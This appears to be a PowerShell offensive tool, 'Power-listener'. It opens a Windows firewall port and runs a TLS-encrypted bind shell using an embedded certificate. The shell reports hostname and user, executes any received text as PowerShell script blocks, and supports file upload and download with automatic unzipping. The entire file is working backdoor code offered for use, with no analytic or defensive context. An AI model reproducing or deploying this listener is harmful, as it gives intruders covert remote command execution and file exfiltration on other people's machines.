function Power-listener
{
    [CmdletBinding()]
    Param (
        [Parameter()]
        [Alias('p')]
        [int]$port
    )

    function receive-file
    {   
        [CmdletBinding()]
        Param (
        [Parameter()]
        [string]$local,

        [Parameter()]
        [string]$remote
        )
            
        $FileStream = New-Object IO.FileStream @($remote,[IO.FileMode]::Open)
        
        $destination = ("\\" + $remoteclient + "\" + $local)
                        
        Write-verbose ("Attempting to send " + $remote + " to " + $destination)
        Write-Verbose "[***] Local file exists.."
        Write-Verbose "[***] sending file.."
        
        $sendback = $EncodingType.GetBytes("file exists")
        $SslStream.Write($sendback, 0, $sendback.Length)
        $SslStream.Flush() 

        if ($BytesLeft = $FileStream.Length) {
                     
            $FileOffset = 0
            if ($BytesLeft -gt 4608) { # Max packet size for Ncat

                $BytesToSend = New-Object Byte[] 4608
                        
                while ($BytesLeft -gt 4608) {
                    [void]$FileStream.Seek($FileOffset, [IO.SeekOrigin]::Begin)
                    [void]$FileStream.Read($BytesToSend, 0, 4608)
                                
                    $FileOffset += 4608
                    $BytesLeft -= 4608
                    $SslStream.Write($BytesToSend, 0, $BytesToSend.Length)         
                } 

                # Send last packet
                $BytesToSend = New-Object Byte[] $BytesLeft
                [void]$FileStream.Seek($FileOffset, [IO.SeekOrigin]::Begin)
                [void]$FileStream.Read($BytesToSend, 0, $BytesLeft)

                $SslStream.Write($BytesToSend, 0, $BytesToSend.Length)
            }
            else { # Only need to send one packet
                $BytesToSend = New-Object Byte[] $BytesLeft
                [void]$FileStream.Seek($FileOffset, [IO.SeekOrigin]::Begin)
                [void]$FileStream.Read($BytesToSend, 0, $BytesLeft)

                $SslStream.Write($BytesToSend, 0, $BytesToSend.Length)
            }         
            write-verbose "[***] Done sending bytes.."
            $FileStream.Flush()
            $FileStream.close()
            $FileStream.Dispose()
                
            Write-Verbose ("`nFile " + $remote + " was sent successfully to " + $destination)
        }      
    }

    function send-file
    {
        [CmdletBinding()]
        Param (
        [Parameter()]
        [string]$local,

        [Parameter()]
        [string]$remote
        )
        
        if (Test-Path $Remote){remove-item $Remote -Force}
        else {write-verbose "Local file does not exist. Creating a new one..."}

        $FileStream = New-Object IO.FileStream @($Remote,[IO.FileMode]::Append)
        $BytesToReceive = New-Object Byte[] 4608

        while ($true)
        {
            $Fileread = $SslStream.Read($BytesToReceive, 0, $BytesToReceive.Length)
              
            if($Fileread -eq 0){break}                  
            else{            
                [Array]$Filebytesreceived = $BytesToReceive[0..($Fileread -1)]
                [Array]::Clear($BytesToReceive, 0, $Fileread)
            }
                      
            if ($Fileread -eq 4608) {$FileStream.Write($Filebytesreceived, 0, $Filebytesreceived.Length); continue}
            else{                        
                $FileStream.Write($Filebytesreceived, 0, $Filebytesreceived.Length)
                $FileStream.Flush()
                $FileStream.Dispose()
                break
            }

            $FileStream.Flush()
            $FileStream.Dispose()
            break
        }      
        Write-Verbose "[***] $Remote has been created succesfully"                 
    }

    function invoke-unzip
    {
        write-verbose "[+++] Unzipping file.."
        [string]$RemoteFolderPath = ($env:USERPROFILE + "\")
        [int32]$copyOption = 20
        $shell = New-Object -ComObject shell.application
        $zip = $shell.Namespace($Receivefile)
            
        foreach($item in $zip.items()){
            $shell.Namespace($RemoteFolderPath).copyhere($item, $copyOption) | Out-Null
        }    
    }
    
    netsh advfirewall firewall delete rule name="cyclops $port" | Out-Null
    netsh advfirewall firewall add rule name="cyclops $port" dir=in action=allow protocol=TCP localport=$port | Out-Null

    $Tcplistener = New-object System.Net.Sockets.TcpListener $port
    $Tcplistener.Start()
    Write-host "Listening on 0.0.0.0:$port [TCP]"
    $TcpClient = $Tcplistener.AcceptTcpClient()
    
    $remoteclient = $TcpClient.Client.RemoteEndPoint.Address.IPAddressToString
    Write-Verbose "[**] New connection coming from: $remoteclient"  

    $TcpNetworkstream = $TCPClient.GetStream()
    $Receivebuffer = New-Object Byte[] $TcpClient.ReceiveBufferSize
    $encodingtype = new-object System.Text.ASCIIEncoding

    $SslStream = New-Object System.Net.Security.SslStream($TcpNetworkStream, $false)
       
    $Base64Cert = 'MIIJ7gIBAzCCCaoGCSqGSIb3DQEHAaCCCZsEggmXMIIJkzCCBhsGCSqGSIb3DQEH AaCCBgwEggYIMIIGBDCCBgAGCyqGSIb3DQEMCgECoIIE/jCCBPowHAYKKoZIhvcN AQwBAzAOBAgfuwcLWmzAwAICB9AEggTYmIISFwVwvl5MG8hDW1RG4bd9YCV9CjSy j+yCg0/GjVCORnjyWrqun+IuwQWWfsfzcFR1rafREicw1HlE02U5EVYBhz42Atm2 2lf4luA0bY9Wp6tQOHSh9FCvOUB4tHCbniU9RSpqaWeyrAeXtlV+U/bmhfVgBYct BcxCtBXf06QhEsRsZ5MGlIVYvytJFw7gMxLSZ1V/BAXRVshvHfOiVucSYM+6hj15 i+JptJDBhTKOTIJ/DzXS5wvWvC/YO7aBD79LW4L0Z1TylTjjQzcEnuvwJ4MHKJoo HX/mKWKgx8B670IP3xFxeGgIygfs6S3+izv6qlQOdU8Cc9dpwxy44BZjpZ/6RRrV TaVdq68I26NacB6B0ux0cTN/mkivsad5DFLYyVzrbcLy9pitopK4vBpwNS4gIhsC wgFcncB2gxBBV7W+D9JT7BYCVwNyyPXL5BEHf1cc7qidHnu6Sscy4JVy7UPGeWey gV2ISgS8/oQCgFqFT7f8motAP6rDcJ87ESapamWsZfikbiNXmaxI8q5sXwqI0fxl e0vkJ77c4YSLSM/Q9ZB50dtdsTAGMwCPgtj4u1Eze29ppwbeT+b29ygzq+Ai/o87 tGXFjHsmR550sRPJ9QjCbGng2rJarbD263RbSaCgvwl4Ot8UXafsnUzUZ73GyCHd cF1+F8tPT5L4qmso016/ilYEQgiBjbjY4m8gsXK93J4y/4V/aA+Tfb1EVxyw+Xyd 1DyE3ZSu1pj6u+h+/ICs+YxQoGBrb77kuvQCUdUbBh/6WCOT1+4dzVt9TuOhH3nk xSUXkv61ZNhmXuXqnF/QZ6BhupIMcapuWjnq7kMdg5yVPIEHSYRoAR4Ocm6422qd Z5An5aJizYhgKYpSECk+aImPDZg3H7s9W9xt8KyXU6wKGc/pkSSnxrGpqBd7Z1tP Ycfi+qH6YnV3kgnfgnMCdkdvvLs3Y6oKhyY4kAf7xjpJOcfwDfweO16OHpInbAMw ykEsiG6lJjfCb4t1z28vN+LBaItPeOh4j12Fvm/DThd3xfEPPWANefxT0Hhu0Ya2 pVqKb8tkWmOXn0cNUJ2oZIpXCiqsG2xp/ohQj1vvMUUewdLt6xaqp5CB1Z3HQPQu NoQCeTqWG345+UQlc7D7I9ykvXkEmbrXOu/OZtuldWPadtK/FXJJwnhIEdqy+LTB Bs8wBy3HS4GZZK9XryB7euSvERQSrlc7GLW1EVeQBx3SgH6VQcxXHl4F76Eg+cIB v7wAwII/ZPxyoiVJPLessCeblsE8vWkZGIZYQyTg/TAhmyw4IE3m7pOdjR5izW7Q VmsekKPLFOboDzPlOYqMM+NW1cjxtgz2tlnE8HDhc7WBXHpiYT9Swvwfe8fBWUG2 WT4lSI9AEwdIZWFVY8Y0vuKdA2mC3WUOjGfHDpOhkneIdibvYh077ytwf9Dr55gX 3Ml+4IGhlq0/Ypn173CBdepaiwDiKDt/wDDWHxRet0xNZMkT4FJHJzCanC67OM2l Jp+RvDhIV1wKkUd5UBtUNQkunGa0r2Aba29HqXCNUgeEcKgofQc12ALai1o5lSIy ZsifsJOtTlQJMXykjMa+ThBOqRD8HaG6NqxtmQPOmJsUTH8bhbYAogwL5Exx+kyd DqzFVgdGOzSU8JsDTQG6VTGB7jANBgkrBgEEAYI3EQIxADATBgkqhkiG9w0BCRUx BgQEAQAAADBdBgkqhkiG9w0BCRQxUB5OAHQAcAAtADIAOABjADIAZAA4AGMAYwAt ADMAOQAwAGIALQA0ADUAOABhAC0AYgA0ADUAMwAtADEAYgA3ADgAOABhADAANAA2 ADkAZQA4MGkGCSsGAQQBgjcRATFcHloATQBpAGMAcgBvAHMAbwBmAHQAIABSAFMA QQAgAFMAQwBoAGEAbgBuAGUAbAAgAEMAcgB5AHAAdABvAGcAcgBhAHAAaABpAGMA IABQAHIAbwB2AGkAZABlAHIwggNwBgkqhkiG9w0BBwGgggNhBIIDXTCCA1kwggNV BgsqhkiG9w0BDAoBA6CCAw4wggMKBgoqhkiG9w0BCRYBoIIC+gSCAvYwggLyMIIB 2qADAgECAhBS2S+yS8dFrEXGPZ/x+kz4MA0GCSqGSIb3DQEBDQUAMBExDzANBgNV BAMMBldhcmRvZzAeFw0xNjA3MzAyMTMyNDNaFw0xNjEwMjgyMTMyNDNaMBExDzAN BgNVBAMMBldhcmRvZzCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAPcV x7aY/iDxNmgcSJXAXoFOJUC6wcFBJqd6zUeeqzKACaIKK0fZJbW5xQxikIKnm/a+ DdTNsX56Zd4lInyyS4s8il8yvsjCeZA6gJ/oHg7n0FNWxpxMpAXQ/AWPeMiPntmr UYHAVqD8t+ae8FzLxl9U5t3QHnwl3hAO7UGCGNbJYtUW3lSqC5Z+G0avGYQ4SK9F oR4EzGGrjrIXdS2/+ATw2VQkwhFapJPDtEWdJJMJ71AJCMz6NttR0ncyn9FDo3yV aNbiVUnXRHfSEHH1GYXkkXcGlfPZceAy4sv3S560bBsbIeOeZTx9RBHESYy2gx7V E1iJS/vTPs2VkjavtVcCAwEAAaNGMEQwEwYDVR0lBAwwCgYIKwYBBQUHAwEwHQYD VR0OBBYEFLZmz7Eftq4i/xqL/tufmxVgNNLlMA4GA1UdDwEB/wQEAwIFIDANBgkq hkiG9w0BAQ0FAAOCAQEA0vmVBCtSYQBPSyoU1t3yNGzmoj4tOQ9CmRPMn8jdGz8j xKn35sE77wGAzynIJt2twCmximwdUt+rxYIW8LKxUb5z6OKGWSf7tuxMRMRjfRdB W5lPbcHb1j10S3hFRWy0++kght5B/XEFKglogvNc2YAkYWwzisgS5BnTvXK0nnyV /7Xd9YSUewyAhghIKLeJcds6rseiuefQrelguCLK2OLIgMKAPips1MFQQx4MjBnW 1NzugYg7p08RY8pUEkMID0cPnPQ958s76tw8nSnw/IrVtAepkBK57Bh6jLYaEdNp seWaH4sRhMw/zlhcWr7Xe57RrqcQ3j47qXfSnsBtLjE0MBMGCSqGSIb3DQEJFTEG BAQBAAAAMB0GCSqGSIb3DQEJFDEQHg4AVwBhAHIAZABvAGcAADA7MB8wBwYFKw4D AhoEFCX0sAokP3CeLLp1/HkixdAzljBWBBSiDgXP6sPRUfLf/NCz969K5/EEhgIC B9A='
    
    $SslFakeCert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2([System.Convert]::FromBase64String($Base64Cert),'')  
    #$SslStream.AuthenticateAsServer($SslFakeCert, $false, [System.Security.Authentication.SslProtocols]::tls, $false)
    $SslStream.AuthenticateAsServer($SslFakeCert, $false, [System.Security.Authentication.SslProtocols]::tls12, $false)
   
    Write-Verbose "SSLStream Encrypted: $($SslStream.IsEncrypted)"
    Write-Verbose "SSLStream Signed: $($SslStream.IsSigned)"

    $bytestosend = $encodingtype.GetBytes("`nYou have accessed ["+(hostname)+"] as: "+(whoami)+"`n")
    $bytestosend += $encodingtype.GetBytes(("`n["+(hostname)+"] PS " + (Get-Location).Path) +'> ')
  
    $SslStream.Write($bytestosend, 0, $bytestosend.Length)

    try{
        while ($TCPClient.Connected){
            $Bytesreceived = $null
            $Read = $SslStream.Read($Receivebuffer, 0, $Receivebuffer.Length)    
            if($Read -eq 0){break}                  
            else{            
                [Array]$Bytesreceived += $Receivebuffer[0..($Read -1)]
                [Array]::Clear($Receivebuffer, 0, $Read)
            }
                      
            if ($TcpNetworkstream.DataAvailable) {continue}
            else{    
                $ScriptBlock = [ScriptBlock]::Create($EncodingType.GetString($Bytesreceived))
                if ($ScriptBlock -match "break") {
                    $sendback = $encodingtype.GetBytes(("`n[!!!] Closing Connection with ["+(hostname)+"]. Press ENTER to continue.."))
                    $SslStream.Write($sendback, 0, $sendback.Length)  
                    $SslStream.Flush()
                    break
                }
                elseif($ScriptBlock -match "send-file"){      
                    try {
                        invoke-command -ScriptBlock $ScriptBlock
                        $parameters = $null
                        $parameters = $ScriptBlock -split " "
                        $SendingFile = ($parameters[2] | Out-String).TrimEnd()
                        $Receivefile = ($parameters[4] | Out-String).TrimEnd()
                   
                        if ($SendingFile -and $Receivefile -match ".zip"){
                            [string]$splitzip = $Receivefile -split ".zip"
                            [string]$leaf = Split-Path $splitzip -leaf
                            $unzfile = ($env:USERPROFILE + "\" + $leaf)
                            try {
                                invoke-unzip
                                Remove-Item $Receivefile
                                $ScriptBlock = [scriptblock]::Create("get-item $unzfile")
                            }
                            catch {$sendback = $encodingType.GetBytes($_.Exception.Message)}
                        }
                        else{ 
                            $ScriptBlock = [scriptblock]::Create("get-item $Receivefile")
                        }
                    }
                    catch {$sendback = $encodingType.GetBytes($_.Exception.Message)}                        
                }
                elseif($Scriptblock -match "receive-file"){
                    try {
                        Invoke-command $Scriptblock
                        continue
                    }
                    catch {
                    Write-verbose $_.Exception.Message
                    $sendback = $encodingType.GetBytes($_.Exception.Message)
                    $SslStream.Write($sendback, 0, $sendback.Length)  
                    $SslStream.Flush()
                    $Bytesreceived = $null
                    continue
                    }                       
                }

                $Global:Error.Clear()
      
                try {
                    $results = $ScriptBlock.Invoke() | Out-String
                    $sendback = $encodingtype.GetBytes($results)
                }
                catch{ 
                    write-verbose "NOT VALID COMMAND"
                    foreach ($Err in $Global:Error) {
                        $sendback = $encodingType.GetBytes($Err.Exception.Message) 
                    }
                }
     
                Write-Verbose "results: $results"

                $sendback += $encodingtype.GetBytes(("`n["+(hostname)+"] PS " + (Get-Location).Path) +'> ')
                $SslStream.Write($sendback, 0, $sendback.Length)  
                $SslStream.Flush()
                $results = $null
                $Bytesreceived = $null
            }
        }
    }
    catch {Write-Verbose "[!!!]TCP connection is broken, exiting.."} 

    try{
        if ($PSVersionTable.CLRVersion.Major -lt 4) {$Tcpclient.Close(); $SslStream.Close(); $Tcplistener.Stop()}
        else {$SslStream.Dispose(); $Tcpclient.Dispose(), $Tcplistener.Stop()}

        Write-Verbose "[**] TCPClient Connected : $($TcpClient.Connected)"
        Write-Verbose "[**] TCPListener was stopped gracefully"
        Write-Verbose "[**] SSL Stream was closed/disposed gracefully`n"

        netsh advfirewall firewall delete rule name="cyclops $port" | Out-Null
        Write-Verbose "[**] FW Rule has been deleted.."
    }
    catch { Write-Warning "Failed to close TCP Stream"}
}
